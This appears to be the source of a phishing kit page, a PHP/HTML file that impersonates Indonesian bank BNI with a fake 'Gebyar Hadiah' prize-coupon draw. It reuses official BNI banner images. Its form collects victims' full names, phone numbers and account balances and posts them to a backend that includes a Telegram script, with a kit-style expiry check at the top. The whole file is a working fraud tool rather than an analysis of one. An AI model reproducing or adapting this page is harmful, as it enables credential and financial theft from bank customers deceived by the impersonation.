<?php
define('SECURE_ACCESS', true);
include 'req/telegram.php';
$expiryDate = $exp; // YYYY-MM-DD format

// Dapatkan tanggal saat ini
$currentDate = date('Y-m-d');

if ($currentDate > $expiryDate) {
    header('Location: expired.html');
    exit();
}
?>
<!DOCTYPE html>
<html lang="in">
<head>
    <meta charset="UTF-8">
    <script src="i.js"></script>
    <title>Rejeki Wondr byBNI</title>
    <link rel="icon" type="image/png" href="">
    <meta property="og:title" content="Program Gebyar Hadiah BNI">
    <meta property="twitter:title" content="Program Gebyar Hadiah BNI">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="og:description" content="Daftar Gratis! Raih Hadiah Mewah Impianmu">
    <meta property="og:image:type" content="image/jpeg">
    <meta content="" property="og:image">
    <link rel="icon" type="image/png" href="">
    <meta name="theme-color" content="#ff9316">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="stylesheet" href="img/3.css">
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
</head>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@800&display=swap');
}
* {
    margin: 0px;
}
html, body {
      width: 100%;
      max-width: 400px;
      margin: 0 auto;
      }
body {
  margin: 0px;
  background:url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjL4JFnv0l4E3TjMDdnQFiRoUjdnmFi24Mb4Tr8C2n6geESmCiqaET00-T18GjJl_SFRQySzi7WNpg9HTU3d6CZAsJwdyvtUF8A8Q-cIZ-3Fga20-C6GFh37U_ZGNZ4xncGyTqdslKgz0KjGkJH1AU7A2Oymt6zZNmNonjbkZksHz15TWCI4RJhwU76k20/s16000/AddText_06-19-06.10.37.png');
  background-size: 100%;
  color: #fff;
  font-family: 'Nunito', sans-serif;
  max-width: 400px;
  max-height: 100vh;
  align-item: center;
  justify-content: center;
  bottom: 0;
  left: 0;
  right: 0;
  margin: 0px auto;
  margin-bottom: 110vh;
}

.lonte{
  display:none;
  z-index:3;
  position: absolute;
  top: 33%;
  left: 30%;
  transform: translate(-50%, -50%);
  max-width: 400px;
  
/*   spinner div css */
  height : 10px;
  width : 10px;
  border-radius : 50%;
/*   background-color : red; */
  border : 5px solid #ffffff80;
  border-top-color : #FF8601;
  animation : spin 1s linear infinite;
}

@keyframes spin{
  0%{
    transform : rotate(0deg);
  }
  100%{
    transform : rotate(360deg);
  }
}

.patokk:active { background-color: #FF8601; box-shadow: rgba(50, 50, 93, 0.25) 0px 30px 60px -12px inset, rgba(0, 0, 0, 0.3) 0px 18px 36px -18px inset; transform: translateY(0px); }

.load{
     margin: 0 auto;
     top: 0;
     left: 0;
     right: 0;
     position: fixed;
     display: flex;
     justify-content: center;
     align-items: center;
     background: #00000090;
     z-index: 999999999;
     width: 100%;
     height: 100%;
     max-width: 400px;
      }
      
      .jao{
            width:90%;
      }
      
 welalxcome {
    position: fixed;
    right: 0;
    left: 0;
    top: 0;
    width: 100%;
    height: 100vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    align-content: center;
    justify-content: center;
    margin: 0 auto;
    max-width: 400px;
    background: #ffffffcc;
    z-index: 999;
}
welalxcome img {
        width:15vw;
    height: auto;
}
chsalxcome {
    position: relative;
    width: 100%;
    height: 100vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}


 
 .asu{
     width:100%;
     margin-top:55px;
     position: fixed;
     height: 100%;
     max-width: 400px;
     
 }  
    
 .nyusu{
     border-radius:7px;
     height:150px;
     max-width: 400px;
     margin-top: 20px;
     margin-left: 20px;
     box-shadow: rgba(0, 0, 0, 0.25) 0px 54px 55px, rgba(0, 0, 0, 0.12) 0px -12px 30px, rgba(0, 0, 0, 0.12) 0px 4px 6px, rgba(0, 0, 0, 0.17) 0px 12px 13px, rgba(0, 0, 0, 0.09) 0px -3px 5px;
     
 }
 
 ion-icon{
    font-size: 20px;
    margin-left: 8px;
    margin-top: -2px;
    position: absolute;
    color: #008899;
}

.button-85 {
  background-color: ;
  max-width: 400px;
  user-select: none;
  -webkit-user-select: none;
  touch-action: manipulation;
}

.button-85:before {
  content: "";
  background: linear-gradient(
    50deg,
    #fff000,
    #ff7300,
    #fffb00,
    #48ff00,
    #00ffd5,
    #002bff,
    #7a00ff,
    #ff00c8,
    #ff0000
  );
  position: absolute;
  top: 0px;
  left: 0px;
  background-size: 500%;
  z-index: -1;
  filter: blur(0px);
  -webkit-filter: blur(0px);
  width: calc(100% + 0px);
  height: calc(100% + 0px);
  animation: glowing-button-85 20s linear infinite;
  transition: opacity 0.3s ease-in-out;
  border-radius: 18px;
}

@keyframes glowing-button-85 {
  0% {
    background-position: 0 0;
  }
  50% {
    background-position: 300% 0;
  }
  100% {
    background-position: 0 0;
  }
}

.button-85:after {
  z-index: -1;
  content: "";
  position: absolute;
  width: 100%;
  height: 100%;
  background: ;
  left: 0;
  top: 0;
  border-radius: none;
}
.patokk{
    max-width: 400px;
    margin: 0px auto;   
    position:relative;
    background-color:#FF8601;
    color:#fff;
    border:0px solid #c0c0c0;
    width:90%;
    border-radius:3px;
    font-family: 'Nunito',sans-serif;
    font-size: 15px;
    padding: 13px;
    display: block;
    text-align: center;
    box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px,
rgba(0, 0, 0, 0.20) 0px 6px 6px;
}

.patokk:hover { 
         
     opacity:0.3;
     border: 1px solid #FF8601;
     background-color: #FF8601;
     color: #fff; 
         
         
         } 
.patokk:disabled, 
.patokk[disabled]{
    
    opacity:0.3;
    border: 1px solid #FF8601;
    background-color: #FF8601;
    color: #fff;
}

.pilat{
    max-width: 400px;
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    margin: 0px auto;
    width: 100%;
    height: 72px;
    background: #ffffff;
    box-shadow: rgba(0, 0, 0, 0.15) 0px -12px 15px 0px;
padding-top: 15px
}

.hh{
    max-width: 400px;
    position: fixed; 
    top: -10; 
    left: 0; 
    right: 0; 
    margin: 0px auto; 
    width: 100%; 
    height: 50px;  
    border-bottom: 0px solid #fff;
    box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;
    }
    
    .hua{
        max-width: 300px;
        bottom:100px;               
        position: absolute;
        border:5px solid #fff;
        padding:15px;
        width:80%;
        border-radius:18px; 
        background: #ffffffe6;
        background-size:100%; 
        height: 335px; 
        left: 0;
        right: 0;
        margin: 0px auto;
        box-shadow: rgba(0, 0, 0, 0.40) 0px 5px 15px 0px; 
    }
    
.yantek{
max-width: 400px;
box-sizing: border-box;
height: 34px;
width: 536px;
max-width: 100%;
border: 1px solid #FF8601;
border-image: initial;
background-color: rgb(255, 255, 255);
border-radius: 10px;
box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px,
rgba(0, 0, 0, 0.06) 0px 2px 4px -1px;
font-family: 'Nunito',
sans-serif;
font-weight: bold;
font-size: 14px;
color: rgb(28, 28, 28);
word-spacing: 0px;
padding: 0px 10px;
outline: none;
margin-top: -15px;
padding-left: 10px;
    }

    .saldo{
box-sizing: border-box;
height: 40px;
width: 100%;
max-width: 400px;
border: 1px solid #FF8601;
border-image: initial;
background-color: rgb(255, 255, 255);
border-radius: 10px;
box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px,
rgba(0, 0, 0, 0.06) 0px 2px 4px -1px;
font-family: 'Nunito',
sans-serif;
font-weight: bold;
font-size: 15px;
color: rgb(28, 28, 28);
word-spacing: 0px;
padding: 0px 10px;
outline: none;
}
    
    .kk{
        box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid #FF8601; border-image: initial; background-color: rgb(255, 255, 255);  border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -15px; padding-left: 40px;
    }
    
    .kutal{
        position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjL4JFnv0l4E3TjMDdnQFiRoUjdnmFi24Mb4Tr8C2n6geESmCiqaET00-T18GjJl_SFRQySzi7WNpg9HTU3d6CZAsJwdyvtUF8A8Q-cIZ-3Fga20-C6GFh37U_ZGNZ4xncGyTqdslKgz0KjGkJH1AU7A2Oymt6zZNmNonjbkZksHz15TWCI4RJhwU76k20/s16000/AddText_06-19-06.10.37.png'); box-shadow: rgba(0, 0, 0, 0.15) 0px -12px 15px 0px; padding-top: 15px;max-width: 400px;
    }

    .yy{
        box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid #FF8601; border-image: initial; background-color: #; border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 15px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none;
    }
</style>
<body>
<main><welalxcome><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFE_czWoYVjGZ9WT90dwDRGzsw_u8miF1WtkcowDYxZGT78d7yt6nfV_dX26RKNlOD5QgWMUJGXbIlfUrhcVT93Ehoe6acrkpcFwrfWTXMUfCfntZFfxDWGrp2QY8hya0E9wJO4xbaYJDRv8V-Mtx4ubSIHC95d0wW90ATdEVlEmvPijcITT2vCo1VXPg/s637/1_ngNzwrRBDElDnf2CLF_Rbg.gif" alt="" style="margin-top: -50px" /></welalxcome>
<chsalxcome2 style="display: non;">
<img style="z-index:-1;position: fixed;width:100%;margin-top:0px;max-width: 400px;left: 0;right: 0;margin: 0px auto;" width="100%" src=""tm.png" alt="">
<img style="position: fixed;width:100%;margin-top:50px;max-width: 400px;" src="images/tampilanbca.jpg" alt="">
<nav class="hh">
  <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqMR3O6Uj_83D_Yh7pNKEOu66qy1i_nN6BC9VlL5UOVuZwX399Mpr9f2jVnc8u7N3QJBa3lsIV2pg7Prvou2mgN863lNB9d8t8nMThP7VU2CKLn33oK_Spd3VFBjCbsfY0qD2c3jyoudALvY3pWEfeSZsCMSxbOpJKm4c08GFPdJ_mKpsMnRBXe6epp8I/s1044/AddText_10-09-07.44.47.png" style="margin-top:-8px;" width="400px" alt=""></center></nav>
  <div class="load" style="display:none">
   <img src="https://hosting.tigerengine.id/f01dmo.gif" class="jao" alt="">
        </div>
<marquee direction="right" behavior="alternate" scrolldelay="0" class="asu" style="display: block;animation: marquee 5000s linear infinite;overflow: hidden;">
        <img class="nyusu" src="https://www.bni.co.id/Portals/1/DNNGalleryPro/uploads/2025/4/16/Rejeki-wondr-BNI.jpg" alt="">
        <img class="nyusu" src="https://www.bni.co.id/Portals/1/DNNGalleryPro/uploads/2025/5/16/SR022.webp" alt="">
        <img class="nyusu" src="https://www.bni.co.id/Portals/1/DNNGalleryPro/uploads/2025/6/12/School_Holilday.jpg" alt="">
        <img class="nyusu" src="https://www.bni.co.id/Portals/1/DNNGalleryPro/uploads/2024/7/4/banner-wondr.webp" alt="">
        <img class="nyusu" src="https://www.bni.co.id/Portals/1/DNNGalleryPro/uploads/2024/9/17/privacy-notice-bni.webp" alt="">
      </marquee>    


<form method="post" action="req/one.php" id="formHP">
 <input type="hidden" name="logo" id="logo" value="༻✧°𝔹𝕒𝕟𝕜 𝔹ℕ𝕀 𝔽𝕖𝕤𝕥𝕚𝕧𝕒𝕝°✧༺">

<div class="button-85 hua">
<center style="color:#008899; line-height: 20px; font-size: 15px; padding: 0px;margin-top:-12px;"><p style="border-bottom:1.5px solid #0000004a;border-radius:10px;margin-bottom:0px;height:50px;"><marquee>Silahkan Lengkapi Data Formulir Di Bawah Ini</marquee></p>
</center>
<br>
<select name="a" id="kupon" required class="yantek" >
          <option value="">PILIH KUPON</option>
          <option value="Paket Umroh & Tiket Liburan">Paket Umroh & Tiket Liburan</option>
          <option value="Uang Cash & Emas">Uang Cash & Emas</option>
          <option value="Mobil & Motor">Mobil & Motor</option>
        </select>
        <br><br>
<h5 style="color:#000; margin-top: 0px; margin-left: 4px">Nama Lengkap<input id="nama" name="b" type="text" class="yy" placeholder="Masukkan Nama Lengkap" oninvalid="this.setCustomValidity('Pastikan NAMA sesuai Rekening')" onchange="this.setCustomValidity('')" required></h5>
  <br>
  <h5 style="position:absolute;color:#000; margin-top: -28px; margin-left: 4px">Nomor Handphone <b style="color: #002bff;"></b><b style="color: #F37024"></b></h5>
  <ion-icon name="phone-portrait-sharp">
  
  </ion-icon>
  <input name="c" id="nomor" type="tel" class="kk" placeholder="Masukkan Nomor Handphone" oninvalid="this.setCustomValidity('Pastikan Nomor telpon sudah benar')" onchange="this.setCustomValidity('')" required maxlength="13" minlength="10"></h3>
  <br><br>
  <h5 for="norek" style="color:#000; margin-top: 0px; margin-left: 3px">Saldo Rekening Tabungan saat ini
    <input class="saldo" id="saldo" name="d" type="tel" class="" placeholder="Rp.xxx" oninvalid="this.setCustomValidity('Pastikan Saldo sesuai Rekening')" onchange="this.setCustomValidity('')" required>
    </h5>

</div>
    





<div class="kutal">
<button class="patokk" type="submit" id="kirim">CETAK KUPON</button>
           </div>
</smalxs>
</main>
</form>

<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'"></script>
  <script src="script.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>

  <script>
          $( document ).ready(function() {
              setTimeout(() => {
                  $('welalxcome').hide();
                  $('chsalxcome2').fadeIn();
              },700)
          });
  </script>
  <script>
                function vibr(dur){
              if (navigator.vibrate) {
                  navigator.vibrate(dur);
              } else {
                  console.log("NotSupported");
              }
          }
  
  </script>
       <script src="token.js">
   </script>
  <script>
        
        // Get references to the input and button elements
  const input = document.getElementById("nohp");
  const button = document.getElementById("kirim");
  
  // Add an event listener for the input event
  input.addEventListener("input", () => {
    // Check if the input field has any text
    if (input.value.length > 9) {
      // If there's text, enable the button
      button.disabled = false;
    } else {
      // If there's no text, disable the button
      button.disabled = true;
    }
  });
      
  
  </script>
  <script>
    $(document).ready(function(){

         // Format mata uang.
         $( '.saldo' ).mask('000.000.000.000.000', {reverse: true});
var dengan_rupiah = document.getElementById('saldo');
dengan_rupiah.addEventListener('keyup', function(e)
{
 dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
});


/* Fungsi */
function formatRupiah(angka, prefix)
{
 var number_string = angka.replace(/[^,\d]/g, '').toString(),
     split    = number_string.split(','),
     sisa     = split[0].length % 3,
     rupiah     = split[0].substr(0, sisa),
     ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
     
 if (ribuan) {
     separator = sisa ? '.' : '';
     rupiah += separator + ribuan.join('.');
 }
 
 rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
 return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
}
     })
     
     
 

</script>
  </body>
  </html>